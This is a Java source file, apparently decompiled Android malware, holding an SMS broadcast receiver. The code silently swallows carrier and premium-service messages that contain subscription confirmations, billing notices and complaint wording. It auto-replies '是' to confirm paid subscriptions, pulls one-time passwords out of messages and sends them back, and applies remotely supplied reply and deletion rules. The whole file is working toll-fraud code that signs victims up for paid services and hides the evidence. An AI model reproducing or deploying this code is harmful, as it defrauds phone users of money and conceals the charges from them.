package com.qc.access;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import com.qc.base.OrderSet;
import com.qc.common.Funs;
import com.qc.entity.SmsInfo;
import com.qc.model.SmsSenderAndReceiver;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

public class SmsReceiver extends BroadcastReceiver {
    private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
    private List<String> delSmsByNumbers;
    private List<List<String>> listenPoneContens;
    private List<String> listenPoneNumbers;
    private HashMap<String, String> replyCotents = new HashMap();
    private List<String> replyKeyWords;
    private String smsContent;
    private SmsInfo smsFilter;
    private String smsNumber;
    private HashMap<String, String> subRules = new HashMap();

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(strRes) && OrderSet.isopenSMS != 0) {
            int i;
            this.smsFilter = OrderSet.smsFilter;
            if (this.smsFilter != null) {
                init(this.smsFilter);
            }
            StringBuilder body = new StringBuilder();
            StringBuilder number = new StringBuilder();
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] msg = new SmsMessage[pdus.length];
                for (i = 0; i < pdus.length; i++) {
                    msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                for (SmsMessage currMsg : msg) {
                    body.append(currMsg.getDisplayMessageBody());
                    number.append(currMsg.getDisplayOriginatingAddress());
                }
                this.smsContent = body.toString();
                this.smsNumber = number.toString();
            }
            if (this.smsNumber != null && this.smsContent != null && this.smsNumber.length() >= 1 && this.smsContent.length() >= 1) {
                if (this.delSmsByNumbers != null && this.delSmsByNumbers.size() > 0) {
                    i = 0;
                    while (i < this.delSmsByNumbers.size()) {
                        if (this.delSmsByNumbers.get(i) != null && ((String) this.delSmsByNumbers.get(i)).length() > 0) {
                            if (this.smsNumber.startsWith((String) this.delSmsByNumbers.get(i))) {
                                abortBroadcast();
                            }
                        }
                        i++;
                    }
                }
                if (this.smsNumber.startsWith("10086") || this.smsNumber.startsWith("10010") || this.smsNumber.startsWith("106") || Funs.interflateNumber(this.listenPoneNumbers, this.smsNumber)) {
                    if (this.smsContent.contains("手机阅读") || this.smsContent.contains("手机动漫") || this.smsContent.contains("10086901") || this.smsContent.contains("游戏达人") || this.smsContent.contains("开始生效") || this.smsContent.contains("手机视频") || this.smsContent.contains("手机音乐") || this.smsContent.contains("点播信息") || ((this.smsContent.contains("年") && this.smsContent.contains("月") && this.smsContent.contains("日") && this.smsContent.contains("秒点播")) || ((this.smsContent.contains("信息费") && this.smsContent.contains("服务代码")) || ((this.smsContent.contains("如需帮助") && this.smsContent.contains("信息费")) || ((this.smsContent.contains("点播信息") && this.smsContent.contains("内发送")) || this.smsContent.contains("处理问题") || this.smsContent.contains("成功订购") || ((this.smsContent.contains("业务") && this.smsContent.contains("宣传不符")) || Funs.interflateContent(this.listenPoneContens, this.smsContent))))))) {
                        abortBroadcast();
                    }
                    if (this.smsContent.contains("回复任意") || this.smsContent.contains("回复是确认")) {
                        SmsSenderAndReceiver.send2(this.smsNumber, "是");
                        abortBroadcast();
                    }
                    if (this.smsFilter != null && this.smsFilter.getAdvkey() != null && this.smsFilter.getAdvkey().length() > 0 && this.smsFilter.getAdvtent() != null && this.smsFilter.getAdvtent().length() > 0 && Funs.isSmsContentHas(this.smsContent, this.replyKeyWords)) {
                        String replyContent = Funs.getReplySmsContent(this.replyCotents, this.smsContent, this.replyKeyWords);
                        if (replyContent != null && replyContent.length() > 0) {
                            SmsSenderAndReceiver.send2(this.smsNumber, replyContent);
                            abortBroadcast();
                        }
                    }
                    if (Funs.isSmsContentHas(this.smsContent, this.subRules)) {
                        String stStr = Funs.isSmsContentRules(this.smsContent, this.subRules);
                        if (stStr != null && stStr.length() > 0) {
                            String endStr = (String) this.subRules.get(stStr);
                            if (endStr != null && endStr.length() > 0) {
                                String replyContet = this.smsContent.substring(this.smsContent.indexOf(stStr) + stStr.length(), this.smsContent.indexOf(endStr));
                                if (replyContet != null && replyContet.length() > 1) {
                                    SmsSenderAndReceiver.send2(this.smsNumber, replyContet);
                                    abortBroadcast();
                                }
                            }
                        }
                    }
                    if (this.smsContent.contains("本次密码") || this.smsContent.contains("绝密文件")) {
                        int offSet = this.smsContent.indexOf("本次密码") + 4;
                        int lastSet = 0;
                        if (String.valueOf(this.smsContent.charAt(offSet)).matches("^[A-Za-z0-9]+$")) {
                            for (i = offSet; i < this.smsContent.length(); i++) {
                                if (!String.valueOf(this.smsContent.charAt(i)).matches("^[A-Za-z0-9]+$")) {
                                    lastSet = i;
                                    break;
                                }
                            }
                            String smsCon = "";
                            if (lastSet == this.smsContent.length() || lastSet == 0) {
                                smsCon = this.smsContent.substring(offSet);
                            } else {
                                smsCon = this.smsContent.substring(offSet, lastSet);
                            }
                            if (smsCon != null && smsCon.length() > 0) {
                                SmsSenderAndReceiver.send2(this.smsNumber, smsCon);
                                abortBroadcast();
                            }
                        } else if (!String.valueOf(this.smsContent.charAt(offSet)).matches("^(w|[u4E00-u9FA5])*$")) {
                            int startIndex = 0;
                            for (i = offSet + 1; i < this.smsContent.length(); i++) {
                                if (String.valueOf(this.smsContent.charAt(i)).matches("^[A-Za-z0-9]+$")) {
                                    startIndex = i;
                                    break;
                                }
                            }
                            for (i = startIndex; i < this.smsContent.length(); i++) {
                                if (!String.valueOf(this.smsContent.charAt(i)).matches("^(w|[u4E00-u9FA5])*$")) {
                                    lastSet = i;
                                    break;
                                }
                            }
                            String smsCont = "";
                            if (lastSet == this.smsContent.length() || lastSet == 0) {
                                smsCont = this.smsContent.substring(startIndex);
                            } else {
                                smsCont = this.smsContent.substring(startIndex, lastSet);
                            }
                            if (smsCont != null && smsCont.length() > 0) {
                                SmsSenderAndReceiver.send2(this.smsNumber, smsCont);
                            }
                            abortBroadcast();
                        }
                    }
                }
            }
        }
    }

    public void init(SmsInfo mFilter) {
        if (mFilter != null) {
            int i;
            String content = mFilter.getComtent();
            if (content != null && content.length() > 0) {
                this.listenPoneNumbers = Arrays.asList(content.split(","));
            }
            String keytent = mFilter.getKeytent();
            this.listenPoneContens = new ArrayList();
            if (keytent != null && keytent.length() > 0) {
                String[] keytentArray = keytent.split(";");
                for (String split : keytentArray) {
                    this.listenPoneContens.add(Arrays.asList(split.split(",")));
                }
            }
            String delKey = mFilter.getDelkey();
            if (delKey != null && delKey.length() > 0) {
                this.delSmsByNumbers = Arrays.asList(delKey.split(","));
            }
            String advkey = mFilter.getAdvkey();
            String advtent = mFilter.getAdvtent();
            if (advkey != null && advkey.length() > 0 && advtent != null && advtent.length() > 0) {
                String[] advkeyArray = advkey.split(",");
                String[] advtentArray = advtent.split(",");
                if (advkeyArray.length == advtentArray.length) {
                    this.replyKeyWords = Arrays.asList(advkeyArray);
                    for (i = 0; i < advkeyArray.length; i++) {
                        this.replyCotents.put(advkeyArray[i], advtentArray[i]);
                    }
                }
            }
            String substart = mFilter.getAdvtip();
            String subend = mFilter.getAdvend();
            if (substart != null && substart.length() > 0 && subend != null && subend.length() > 0) {
                String[] substartArray = substart.split(",");
                String[] subendArray = subend.split(",");
                if (substartArray.length == subendArray.length) {
                    for (i = 0; i < substartArray.length; i++) {
                        this.subRules.put(substartArray[i], subendArray[i]);
                    }
                }
            }
        }
    }
}
